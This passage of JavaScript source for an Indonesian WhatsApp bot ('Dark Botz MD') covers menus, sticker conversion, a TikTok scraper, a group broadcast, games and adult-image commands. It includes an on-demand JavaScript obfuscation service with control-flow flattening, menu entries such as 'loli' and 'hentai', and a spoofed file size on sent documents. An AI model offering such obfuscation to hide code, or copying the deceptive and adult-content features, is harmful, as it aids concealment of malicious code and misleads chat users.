        const tokenn = await axios.get("https://downvideo.quora-wiki.com/tiktok-video-downloader#url=" + url);
        let a = cheerio.load(tokenn.data);
        let token = a("#token").attr("value");
        const param = {
            url: url,
            token: token,
        };
        const { data } = await axios.request("https://downvideo.quora-wiki.com/system/action.php", {
                method: "post",
                data: new URLSearchParams(Object.entries(param)),
                headers: {
                    "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                    "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36",
                    "referer": "https://downvideo.quora-wiki.com/tiktok-video-downloader",
                },
            }
        );
        return {
            status: 200,
            title: data.title,
            thumbnail: "https:" + data.thumbnail,
            duration: data.duration,
            media: data.medias,
        };
    } catch (e) {
        return e
    }
}

async function obfus(query) {
    return new Promise((resolve, reject) => {
        try {
        const obfuscationResult = jsobfus.obfuscate(query,
        {
            compact: false,
            controlFlowFlattening: true,
            controlFlowFlatteningThreshold: 1,
            numbersToExpressions: true,
            simplify: true,
            stringArrayShuffle: true,
            splitStrings: true,
            stringArrayThreshold: 1
        }
        );
        const result = {
            status: 200,
            author: `dark`,
            result: obfuscationResult.getObfuscatedCode()
        }
        resolve(result)
    } catch (e) {
        reject(e)
    }
    })
}

if (autosticker) {
if (/image/.test(mime) && !/webp/.test(mime)) {
let media = await quoted.download()
let encmedia = await dark.sendImageAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
} else if (/video/.test(mime) && !/webp/.test(mime)) {
if ((quoted.msg || quoted).seconds > 11) return reply('Maksimal 10 detik!')
let media = await quoted.download()
let encmedia = await dark.sendVideoAsSticker(m.chat, media, m, { packname: global.packname, author: global.author })
await fs.unlinkSync(encmedia)
}
}

if (m.isGroup && !m.key.fromMe && !itsMedark && antilink) {
if (!isBotAdmins) return
if (budy.match(`chat.whatsapp.com`)) {
dark.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
dark.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (m.isGroup && !m.key.fromMe && !itsMedark && antiwame) {
if (!isBotAdmins) return
if (budy.match(`wa.me`)) {
dark.sendMessage(m.chat, {text: `*Antilink Group Terdeteksi*\n\nKamu Akan Dikeluarkan Dari Group ${groupMetadata.subject}`}, {quoted:m})
dark.groupParticipantsUpdate(m.chat, [sender], 'remove')
}
}

if (!isCmd && m.isGroup && isAlreadyResponList(m.chat, chath, db_respon_list)) {
var get_data_respon = getDataResponList(m.chat, chath, db_respon_list)
if (get_data_respon.isImage === false) {
dark.sendMessage(m.chat, { text: sendResponList(m.chat, chath, db_respon_list) }, { quoted: m })
} else {
buff = await getBuffer(get_data_respon.image_url)
dark.sendImage(m.chat, buff, `${get_data_respon.response}`, m)
}
}

const nebal = (angka) => {
return Math.floor(angka)
}
if (!isCmd && isAlreadydarkList(chath, dblist)) {
var getmddata = getDatadarkList(chath, dblist)
if (getmddata.isImage === false) {
dark.sendMessage(m.chat, { text: senddarkList(chath, dblist) }, { quoted: m })
} else {
buff = await getBuffer(getmddata.image_url)
dark.sendImage(m.chat, buff, `${getmddata.response}`, m)
}
}
switch (command) {
case 'menu':{
let text = `╭─「 *All Menu* 」
│ あ ${prefix}menu
│ 友 ${prefix}ai
│ 友 ${prefix}img
│ 友 ${prefix}menfes
│ 友 ${prefix}confes
│ 友 ${prefix}autosticker
│ 友 ${prefix}ss
│
├「 *Download* 」
│ 友 ${prefix}yts
│ 友 ${prefix}ytmp3
│ 友 ${prefix}ytmp4 
│ 友 ${prefix}tt
│
├「 *Convert* 」
│ 友 ${prefix}sticker
│ 友 ${prefix}swm
│ 友 ${prefix}removebg
│ 友 ${prefix}tts
│ 友 ${prefix}tovn
│ 友 ${prefix}ttp
│ 友 ${prefix}attp
│ 友 ${prefix}smeme
│ 友 ${prefix}emojimix
│ 友 ${prefix}tourl
│ 友 ${prefix}toaudio
│ 友 ${prefix}tomp3
│ 友 ${prefix}toimg
│
├「 *Tools* 」
│ 友 ${prefix}turu 
│ 友 ${prefix}logout
│ 友 ${prefix}kenon
│ 友 ${prefix}obfus
│ 友 ${prefix}deobfus
│ 友 ${prefix}googles
│ 友 ${prefix}manga
│ 友 ${prefix}del
│ 友 ${prefix}public
│ 友 ${prefix}self
│ 友 ${prefix}gitclone
│ 友 ${prefix}>
│
├「 *Game* 」
│ 友 ${prefix}ttc
│ 友 ${prefix}delttc
│ 友 ${prefix}jadian
│ 友 ${prefix}suit
│ 友 ${prefix}suitbot
│
├「 *Info* 」
│ 友 ${prefix}ping
│ 友 ${prefix}speedtest
│ 友 ${prefix}pinterest
│ 友 ${prefix}infogempa
│ 友 ${prefix}infobot
│ 友 ${prefix}rules
│ 友 ${prefix}report
│
├「 *Owner* 」
│ 友 ${prefix}ban add/del
│ 友 ${prefix}listban
│ 友 ${prefix}setppbot
│ 友 ${prefix}setppbot2
│ 友 ${prefix}jadibot
│ 友 ${prefix}listjadibot
│ 友 ${prefix}restart
│
├「 *Group* 」
│ 友 ${prefix}gc
│ 友 ${prefix}afk
│ 友 ${prefix}getpp
│ 友 ${prefix}setppgc
│ 友 ${prefix}setppgc2
│ 友 ${prefix}leave
│ 友 ${prefix}add
│ 友 ${prefix}kick
│ 友 ${prefix}liston
│ 友 ${prefix}setdesk
│ 友 ${prefix}hidetag
│ 友 ${prefix}tagall
│ 友 ${prefix}setname
│ 友 ${prefix}antilink
│ 
├「 *Random Image* 」
│ 友 ${prefix}ppcp
│ 友 ${prefix}loli
│ 友 ${prefix}waifu
│ 友 ${prefix}cecan
│ 友 ${prefix}neko
│ 友 ${prefix}hentai
│ 友 ${prefix}kitsune
│ 友 ${prefix}sfw
│ 友 ${prefix}nsfw
│
├「 *Database* 」
│ 友 ${prefix}list
│ 友 ${prefix}addlist
│ 友 ${prefix}dellist
│
├「 *Text Pro* 」
│ 友 ${prefix}3dchristmas
│ 友 ${prefix}3ddeepsea
│ 友 ${prefix}americanflag
│ 友 ${prefix}3dscifi
│ 友 ${prefix}3drainbow
│ 友 ${prefix}3dwaterpipe
│ 友 ${prefix}halloweenskeleton
│ 友 ${prefix}sketch
│ 友 ${prefix}bluecircuit
│ 友 ${prefix}space
│ 友 ${prefix}metallic
│ 友 ${prefix}fiction
│ 友 ${prefix}greenhorror
│ 友 ${prefix}transformer
│ 友 ${prefix}berry
│ 友 ${prefix}thunder
│ 友 ${prefix}magma
│ 友 ${prefix}3dcrackedstone
│ 友 ${prefix}3dneonlight
│ 友 ${prefix}impressiveglitch
│ 友 ${prefix}naturalleaves
│ 友 ${prefix}fireworksparkle
│ 友 ${prefix}matrix
│ 友 ${prefix}dropwater
│ 友 ${prefix}harrypotter
│ 友 ${prefix}foggywindow
│ 友 ${prefix}neondevils
│ 友 ${prefix}christmasholiday
│ 友 ${prefix}3dgradient
│ 友 ${prefix}blackpink
│ 友 ${prefix}gluetext
│ 友 ${prefix}glitch3
│ 友 ${prefix}harrypot
│ 友 ${prefix}graffiti
│ 友 ${prefix}pornhub
│ 友 ${prefix}glitch2
│ 友 ${prefix}3dspace
│ 友 ${prefix}lion
│ 友 ${prefix}wolf
│ 友 ${prefix}retro
│ 友 ${prefix}8bit
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
let thumbnail = fs.readFileSync("./p.jpg", 'base64')
let doc = fs.readFileSync("./image/document.xlsx")
let fileLength = 100067430556
let mime = 'application/vnd.openxmlformats-officedocument.spreadsheetml.sheet'
let fileName = `Dark Botz MD`
let buttons = [
{ urlButton: { displayText: 'REST APIs', url: 'https://api.darktzy.eu.org' }},
{ urlButton: { displayText: 'GITHUB', url: 'https://github.com/darkbotzmd' }},
{ quickReplyButton: { displayText: 'OWNER', id: `${prefix}owner` }},
{ quickReplyButton: { displayText: 'DONASI', id: `${prefix}donasi` }},
{ quickReplyButton: { displayText: 'LIST MENU', id: `${prefix}listmenu`}}
]
let buttonMessage = {
	document: doc,
	mimetype: mime,
	fileName: fileName,
	fileLength: fileLength,
	caption: text, 
	footer: 'This Is Simple WhatsApp Bot', 
	templateButtons: buttons,
	viewOnce: true,
	jpegThumbnail: thumbnail
}
dark.sendMessage(from, buttonMessage)
}
break
case 'textpromenu':
menu = `
╭─「 *Text Pro* 」
│ 友 ${prefix}3dchristmas
│ 友 ${prefix}3ddeepsea
│ 友 ${prefix}americanflag
│ 友 ${prefix}3dscifi
│ 友 ${prefix}3drainbow
│ 友 ${prefix}3dwaterpipe
│ 友 ${prefix}halloweenskeleton
│ 友 ${prefix}sketch
│ 友 ${prefix}bluecircuit
│ 友 ${prefix}space
│ 友 ${prefix}metallic
│ 友 ${prefix}fiction
│ 友 ${prefix}greenhorror
│ 友 ${prefix}transformer
│ 友 ${prefix}berry
│ 友 ${prefix}thunder
│ 友 ${prefix}magma
│ 友 ${prefix}3dcrackedstone
│ 友 ${prefix}3dneonlight
│ 友 ${prefix}impressiveglitch
│ 友 ${prefix}naturalleaves
│ 友 ${prefix}fireworksparkle
│ 友 ${prefix}matrix
│ 友 ${prefix}dropwater
│ 友 ${prefix}harrypotter
│ 友 ${prefix}foggywindow
│ 友 ${prefix}neondevils
│ 友 ${prefix}christmasholiday
│ 友 ${prefix}3dgradient
│ 友 ${prefix}blackpink
│ 友 ${prefix}gluetext
│ 友 ${prefix}glitch3
│ 友 ${prefix}harrypot
│ 友 ${prefix}graffiti
│ 友 ${prefix}pornhub
│ 友 ${prefix}glitch2
│ 友 ${prefix}3dspace
│ 友 ${prefix}lion
│ 友 ${prefix}wolf
│ 友 ${prefix}retro
│ 友 ${prefix}8bit
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'database':
menu = `
╭─「 *Database* 」
│ 友 ${prefix}list
│ 友 ${prefix}addlist
│ 友 ${prefix}dellist
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'randomimage':
menu = `
╭─「 *Random Image* 」
│ 友 ${prefix}ppcp
│ 友 ${prefix}loli
│ 友 ${prefix}waifu
│ 友 ${prefix}cecan
│ 友 ${prefix}neko
│ 友 ${prefix}hentai
│ 友 ${prefix}kitsune
│ 友 ${prefix}sfw
│ 友 ${prefix}nsfw
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'groupmenu':
menu = `
╭─「 *Group* 」
│ 友 ${prefix}gc
│ 友 ${prefix}afk
│ 友 ${prefix}getpp
│ 友 ${prefix}setppgc
│ 友 ${prefix}setppgc2
│ 友 ${prefix}leave
│ 友 ${prefix}add
│ 友 ${prefix}kick
│ 友 ${prefix}liston
│ 友 ${prefix}setdesk
│ 友 ${prefix}hidetag
│ 友 ${prefix}tagall
│ 友 ${prefix}setname
│ 友 ${prefix}antilink
│ 
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'ownermenu':
menu = `
╭─「 *Owner* 」
│ 友 ${prefix}ban add/del
│ 友 ${prefix}listban
│ 友 ${prefix}setppbot
│ 友 ${prefix}setppbot2
│ 友 ${prefix}jadibot
│ 友 ${prefix}listjadibot
│ 友 ${prefix}restart
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'infomenu':
menu = `
╭─「 *Info* 」
│ 友 ${prefix}ping
│ 友 ${prefix}speedtest
│ 友 ${prefix}pinterest
│ 友 ${prefix}infogempa
│ 友 ${prefix}infobot
│ 友 ${prefix}rules
│ 友 ${prefix}report
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'gamemenu':
menu = `
╭─「 *Game* 」
│ 友 ${prefix}ttc
│ 友 ${prefix}delttc
│ 友 ${prefix}jadian
│ 友 ${prefix}suit
│ 友 ${prefix}suitbot
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'toolsmenu':
menu = `
╭─「 *Tools* 」
│ 友 ${prefix}turu 
│ 友 ${prefix}logout
│ 友 ${prefix}kenon
│ 友 ${prefix}obfus
│ 友 ${prefix}deobfus
│ 友 ${prefix}googles
│ 友 ${prefix}manga
│ 友 ${prefix}del
│ 友 ${prefix}public
│ 友 ${prefix}self
│ 友 ${prefix}gitclone
│ 友 ${prefix}>
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'convertmenu':
menu = `
╭─「 *Convert* 」
│ 友 ${prefix}sticker
│ 友 ${prefix}swm
│ 友 ${prefix}removebg
│ 友 ${prefix}tts
│ 友 ${prefix}tovn
│ 友 ${prefix}ttp
│ 友 ${prefix}attp
│ 友 ${prefix}smeme
│ 友 ${prefix}emojimix
│ 友 ${prefix}tourl
│ 友 ${prefix}toaudio
│ 友 ${prefix}tomp3
│ 友 ${prefix}toimg
│
╰─「 *𝐃𝐚𝐫𝐤𝐓𝐳𝐲 友* 」`
buttonss2 = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'BACK TO MENU'}, type: 1}
]
pa3 = {
text: menu,
footer: 'This Is Simple WhatsApp Bot', 
buttons: buttonss2,
headerType: 1
}
dark.sendMessage(from, pa3, {quoted: m})
break
case 'listmenu':
  let sections = [
{
title: "DAFTAR MENU",
rows: [
{title: "Convert Menu", rowId: `${prefix}convertmenu`, description: `Menampilkan daftar convert menu`},
{title: "Tools Menu", rowId: `${prefix}toolsmenu`, description: `Menampilkan daftar tools menu`},
{title: "Game Menu", rowId: `${prefix}gamemenu`, description: `Menampilkan daftar game menu`},
{title: "Info Menu", rowId: `${prefix}infomenu`, description: `Menampilkan daftar info menu`},
{title: "Owner Menu", rowId: `${prefix}ownermenu`, description: `Menampilkan daftar owner menu`},
{title: "Group Menu", rowId: `${prefix}groupmenu`, description: `Menampilkan daftar group menu`},
{title: "Random Image", rowId: `${prefix}randomimage`, description: `Menampilkan daftar random image`},
{title: "Database", rowId: `${prefix}database`, description: `Menampilkan daftar database menu`},
{title: "Text Pro Menu", rowId: `${prefix}textpromenu`, description: `Menampilkan daftar text pro menu`},
]
},
{
title: "© CREDIT",
rows: [{title: "Owner", rowId: `${prefix}owner`, description: `Owner Bot`},
{title: "Script", rowId: `${prefix}sc`, description: `Info Script`},
{title: "Gatau Ini Apaan", rowId: `wkwk`, description: `Gatau Buat Apaan`}
]
}, 
]
dark.sendListMsg(m.chat, `Hallo *${pushname}* ${ucapanWaktu}\nPilih salah satu menu di bawah`,`*© Dark Botz MD*`, `*LIST MENU*`, `Click Here`, sections, m)
break
case 'img': case 'ai-img': case 'image': case 'images':
reply(mess.wait)
try {
if (global.keyopenai === 'ISI_APIKEY_OPENAI_DISINI') return reply('Apikey belum diisi\n\nSilahkan isi terlebih dahulu apikeynya di file key.json\n\nApikeynya bisa dibuat di website: https://beta.openai.com/account/api-keys');
if (!q) return reply(`Membuat gambar dari AI.\n\nContoh:\n${prefix}${command} Wooden house on snow mountain`);
const configuration = new Configuration({
apiKey: global.keyopenai,
});
const openai = new OpenAIApi(configuration);
const response = await openai.createImage({
prompt: q,
n: 1,
size: '512x512',
});
//console.log(response.data.data[0].url)
dark.sendImage(from, response.data.data[0].url, q, m);
} catch (error) {
if (error.response) {
console.log(error.response.status);
console.log(error.response.data);
console.log(`${error.response.status}\n\n${error.response.data}`);
} else {
console.log(error);
reply('Maaf, sepertinya ada yang error :'+ error.message);
}
}
break
case  'bcgc':{
if (!itsMedark) return reply(mess.owner)
if (!q) return reply('Teksnya?')
let getGroups = await dark.groupFetchAllParticipating()
let groupss = Object.entries(getGroups).slice(0).map(entry => entry[1])
let anus = groupss.map(v => v.id)
reply(`Mengirim Broadcast Ke ${anus.length} Chat, Waktu Selesai ${anus.length * 0.5 } detik`)
let yesnih = [{"buttonId": `${prefix}listmenu`,"buttonText": {"displayText": `LIST MENU`},"type": "RESPONSE"},
                        {"buttonId": `${prefix}owner`,"buttonText": {"displayText": `OWNER`},"type": "RESPONSE"}]
let muk = [{urlButton: {displayText: `GITHUB`,url: `https://github.com/darkbotmd`}}]
let teks = `*BROADCAST GROUP*\n\n${q}`
if (isImage || isQuotedImage) { //Image
let buff = await dark.downloadAndSaveMediaMessage(quoted,makeid(5))
//let buffer = fs.readFileSync(file)
for (let i of anus) {
await sleep(1000)
await dark.sendMessage(i, {caption: teks, image: fs.readFileSync(buff)}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else  if (isVideo || isQuotedVideo) { //Video
let buff = await dark.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await dark.sendMessage(i, {caption: teks, video: buff}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else if (isAudio || isQuotedAudio) { //Audio
let buff = await conn.downloadAndSaveMediaMessage(quoted,makeid(5))
for (let i of anus) {
await sleep(1000)
await dark.sendMessage(i, {caption: teks, audio: fs.readFileSync(buff)}, { quoted: ftroli})
}
fs.unlinkSync(buff)
} else {
for (let i of anus) {
let toks = `┏━ ❮❮ 𝙼𝙴𝚂𝚂𝙴𝙶𝙴 ❯❯
┣❲  ${q}
┖─┅┈⸔⸔⬫
┏┬┬┬┬┬┬┬┬┬┬┬┬┬⁛⸙⸙
┃⫹⫺ 𝚁𝚞𝚗𝚝𝚒𝚖𝚎 : ${runtime(process.uptime())}
┃⫹⫺ 𝙳𝚊𝚝𝚎 : ${calender}
┃⫹⫺ 𝚝𝚒𝚖𝚎 : 
┖──┈┈┈〠⸙࿉༐`
let teks2 = "_Broadcast Group_/n"
await sleep(1000)
await dark.send5ButLoc(i, teks2, toks, fs.readFileSync('./stik/thumb.jpeg'),  muk) 
}
}
reply(`Sukses Mengirim Broadcast Ke ${anus.length} Group`)
}
break 
case 'infogempa': {
reply(mess.wait)
get_result = await fetchJson(`https://api.akuari.my.id/info/gempa`)
get_result = get_result.result
ini_txt = `• Tanggal: ${get_result.tanggal}\n`
ini_txt += `• Jam: ${get_result.jam}\n`
ini_txt += `• Lintang: ${get_result.lintang}\n`
ini_txt += `• Bujur: ${get_result.bujur}\n`
ini_txt += `• Kekuatan: ${get_result.magnitude} SR\n`
ini_txt += `• Kedalaman: ${get_result.kedalaman}\n`
ini_txt += `• Wilayah: ${get_result.wilayah}\n`
ini_txt += `• Potensi: ${get_result.potensi}\n`
dark.sendImage(m.chat, get_result.image, ini_txt, m)
}
break
case 'suitbot':
var but = [{buttonId: `${prefix}sbatu`, buttonText: { displayText: "Batu ✊" }, type: 1 }, {buttonId: `${prefix}sgunting`, buttonText: { displayText: "Gunting ✌️" }, type: 1 }, {buttonId: `${prefix}skertas`, buttonText: { displayText: "Kertas ✋" }, type: 1 }]
var sutit = `*[ GAME SUIT ]*\n\nNOTE : *KAMU MEMILIKI 3 BUTTON DAN 3 KESEMPATAN UNTUK MEMILIH ANTARA BATU GUNTING KERTAS*\n*JIKA KAMU MEMENANGKAN 3 KESEMPATAN PERMAINAN BATU GUNTING KERTAS*\n*KAMU MENANG!!*`
dark.sendMessage(m.chat, { text: sutit, buttons: but, footer: "Pilih Button Di Bawah\n\n- _Jika Kamu Pakai WhatsApp Mod Langsung Saja Ketik #sgunting, #sbatu, #skertas_", templateButtons: but }, {quoted: m})
break
case 'sbatu':
const batu = [`Aku Memilih *Batu*\nKamu Memilih *Batu*\n\n!! KITA SERI !!`,`Aku Memilih *Gunting*\nKamu Memilih *Batu*\n\n!! KAMU MENANG:( !!`,`Aku Memilih *Kertas*\nKamu Memilih *Batu*\n\n!! AKU MENANG !!`]
const batuh = batu[Math.floor(Math.random() * batu.length)]
var batuh2 = `*[ GAME SUIT ]*\n\n${batuh}`
dark.sendMessage(m.chat, { text: batuh2 }, { quoted: m })
break
case 'sgunting':
const gunting = [`Aku Memilih *Batu*\nKamu Memilih *Gunting*\n\n!! AKU MENANG !!`,`Aku Memilih *Gunting*\nKamu Memilih *Gunting*\n\n!! KITA SERI !!`,`Aku Memilih *Kertas*\nKamu Memilih *Gunting*\n\n!! KAMU MENANG :( !!`]
const guntingh = gunting[Math.floor(Math.random() * gunting.length)]
var guntingh2 = `*[ GAME SUIT ]*\n\n${guntingh}`
dark.sendMessage(m.chat, { text: guntingh2 }, { quoted: m})
break
case 'skertas':
const kertas = [`Aku Memilih *Batu*\nKamu Memilih *Kertas*\n\n!! KAMU MENANG :( !!`,`Aku Memilih *Gunting*\nKamu Memilih *Kertas*\n\n!! KAMU KALAH !!`,`Aku Memilih *Kertas*\nKamu Memilih *Kertas*\n\n!! KITA SERI !!`]
const kertash = kertas[Math.floor(Math.random() * kertas.length)]
var kertash2 = `*[ GAME SUIT ]*\n\n${kertash}`
dark.sendMessage(m.chat, { text: kertash2 }, { quoted: m })
break
case 'suitpvp': case 'suit': {
this.suit = this.suit ? this.suit : {}
let poin = 10
let poin_lose = 10
let timeout = 60000
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.sender))) reply(`Selesaikan suit mu yang sebelumnya`)
if (m.mentionedJid[0] === m.sender) return reply(`Tidak bisa bermain dengan diri sendiri !`)
if (!m.mentionedJid[0]) return reply(`_Siapa yang ingin kamu tantang?_\nTag orangnya..\n\nContoh : ${prefix}suit @${sender.split("@")[0]}`)
if (Object.values(this.suit).find(roof => roof.id.startsWith('suit') && [roof.p, roof.p2].includes(m.mentionedJid[0]))) return reply( `Orang yang kamu tantang sedang bermain suit bersama orang lain :(`)
let id = 'suit_' + new Date() * 1
let caption = `_*SUIT PvP*_

@${m.sender.split`@`[0]} menantang @${m.mentionedJid[0].split`@`[0]} untuk bermain suit

Silahkan @${m.mentionedJid[0].split`@`[0]} untuk ketik terima/tolak`
this.suit[id] = {
chat: await dark.sendText(m.chat, caption, m, { mentions: parseMention(caption) }),
id: id,
p: m.sender,
p2: m.mentionedJid[0],
status: 'wait',
waktu: setTimeout(() => {
if (this.suit[id]) dark.sendText(m.chat, `_Waktu suit habis_`, m)
delete this.suit[id]
}, 60000), poin, poin_lose, timeout
}
}
break
case 'nsfw': {
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/nsfw/waifu`)
buffer = await getBuffer(anu.url)
dark.sendMessage(m.chat, { image: buffer, caption: `Nih`, footer: 'This Is Simple WhatsApp Bot'}, { quoted: m })
}
break
case 'sfw': {
reply(mess.wait)
anu = await fetchJson(`https://waifu.pics/api/sfw/waifu`)
buffer = await getBuffer(anu.url)
dark.sendMessage(m.chat, { image: buffer, caption: `Nih`, footer:  'This Is Simple WhatsApp Bot'}, { quoted: m })
}
break
case 'manga':
  reply(mess.wait)
  const { Manga } =require("@shineiichijo/marika")

const manga = new Manga();

if(!q) return reply(`Manga apa yg kamu cari??\nExample ${prefix}manga naruto`)
let srh = await manga.searchManga(q)
    let mang = `• *Title: ${srh.data[0].title}*\n`;
    mang += `• *Status: ${srh.data[0].status}*\n`;
    mang += `• *Total Volumes: ${srh.data[0].volumes}*\n`;
    mang += `• *Total Chapters: ${srh.data[0].chapters}*\n`;
    mang += `• *Genres:*\n`;
    for (let i = 0; i < srh.data[0].genres.length; i++) {
 mang += `\t\t\t\t\t\t\t\t*${srh.data[0].genres[i].name}*\n`;
    }
    mang += `• *Published on: ${srh.data[0].published.from}*\n`;
    mang += `• *Score: ${srh.data[0].scored}*\n`;
    mang += `• *Popularity: ${srh.data[0].popularity}*\n`;
    mang += `• *Favorites: ${srh.data[0].favorites}*\n`;
    mang += `• *Authors:*\n`;
    for (let i = 0; i < srh.data[0].authors.length; i++) {
 mang += `\t\t\t\t\t\t\t\t\t*${srh.data[0].authors[i].name}* *(${srh.data[0].authors[0].type})*\n`;
    }
    mang += `\n• *URL: ${srh.data[0].url}*\n\n`;
    if (srh.data[0].background !== null)
 mang += `• *Background:* ${srh.data[0].background}`;
    mang += `• *Description:* ${srh.data[0].synopsis.replace(
 /\[Written by MAL Rewrite]/g,
 ""
    )}`;
dark.sendMessage(m.chat,{image:{url:srh.data[0].images.jpg.large_image_url},caption:mang},{quoted:m})  
break
case 'infobot':
    let anubb = await store.chats.all().filter(v => v.id.endsWith('.net')).map(v => v.id)

let anubbgc = await store.chats.all().filter(v => v.id.endsWith('@g.us')).map(v => v.id)

reply(`友 Namabot : *Dark Botz MD*
友 Platform : *${os.platform()}*
友 Host name : *${os.hostname()}*
友 Wa Version : 2.23.1.76
友 List Private Chat : *${anubb.length}*
友 List Group : *${anubbgc.length}*
友 Listban : *${banned.length}*
`)
break
case 'candy': case 'christmas': case '3dchristmas': case 'sparklechristmas': case 'holographic':
case 'deepsea': case 'scifi': case 'rainbow': case 'waterpipe': case 'spooky': case 'karbon': case 'neonlight2': 
case 'pencil': case 'circuit': case 'discovery': case 'metalic': case 'fiction': case 'demon': case '3dbox': 
case 'transformer': case 'berry': case 'thunder': case 'magma': case '3dstone': case 'greenneon': 
case 'neonlight': case 'glitch': case 'harrypotter': case 'brokenglass': case 'papercut': case 'lion2': 
case 'watercolor': case 'multicolor': case 'neondevil': case 'underwater': case 'graffitibike': case '3davengers': 
 case 'snow': case 'cloud': case 'honey': case 'ice': case 'fruitjuice': case 'biscuit': case 'wood': case 'whitebear': 
case 'chocolate': case 'strawberry': case 'matrix': case 'blood': case 'dropwater': case 'toxic': 
case 'lava': case 'rock': case 'bloodglas': case 'hallowen': case 'darkgold': case 'joker': case 'wicker':
 case 'firework': case 'skeleton': case 'blackpink': case 'sand': case 'glue': case '1917': case 'leaves': {
			 if (!q) return reply(`Example : ${prefix + command} Dark Botz MD`) 
             reply(mess.wait)
             let link
             if (/candy/.test(command)) link = 'https://textpro.me/create-christmas-candy-cane-text-effect-1056.html'
			 if (/bluecircuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/neonlight2/.test(command)) link = 'https://textpro.me/neon-light-text-effect-with-galaxy-style-981.html'
             if (/christmas/.test(command)) link = 'https://textpro.me/christmas-tree-text-effect-online-free-1057.html'
             if (/3dchristmas/.test(command)) link = 'https://textpro.me/3d-christmas-text-effect-by-name-1055.html'
             if (/sparklechristmas/.test(command)) link = 'https://textpro.me/sparkles-merry-christmas-text-effect-1054.html'
             if (/deepsea/.test(command)) link = 'https://textpro.me/create-3d-deep-sea-metal-text-effect-online-1053.html'
             if (/scifi/.test(command)) link = 'https://textpro.me/create-3d-sci-fi-text-effect-online-1050.html'
             if (/whitebear/.test(command)) link = 'https://textpro.me/online-black-and-white-bear-mascot-logo-creation-1012.html'
             if (/holographic/.test(command)) link = 'https://textpro.me/holographic-3d-text-effect-975.html'
             if (/3davengers/.test(command)) link = 'https://textpro.me/create-3d-avengers-logo-online-974.html'
             if (/rainbow/.test(command)) link = 'https://textpro.me/3d-rainbow-color-calligraphy-text-effect-1049.html'
             if (/waterpipe/.test(command)) link = 'https://textpro.me/create-3d-water-pipe-text-effects-online-1048.html'
             if (/spooky/.test(command)) link = 'https://textpro.me/create-halloween-skeleton-text-effect-online-1047.html'
             if (/greenneon/.test(command)) link = 'https://textpro.me/green-neon-text-effect-874.html'
             if (/lion2/.test(command)) link = 'https://textpro.me/create-lion-logo-mascot-online-938.html'
             if (/3dbox/.test(command)) link = 'https://textpro.me/3d-box-text-effect-online-880.html'
             if (/pencil/.test(command)) link = 'https://textpro.me/create-a-sketch-text-effect-online-1044.html'
             if (/circuit/.test(command)) link = 'https://textpro.me/create-blue-circuit-style-text-effect-online-1043.html'
             if (/discovery/.test(command)) link = 'https://textpro.me/create-space-text-effects-online-free-1042.html'
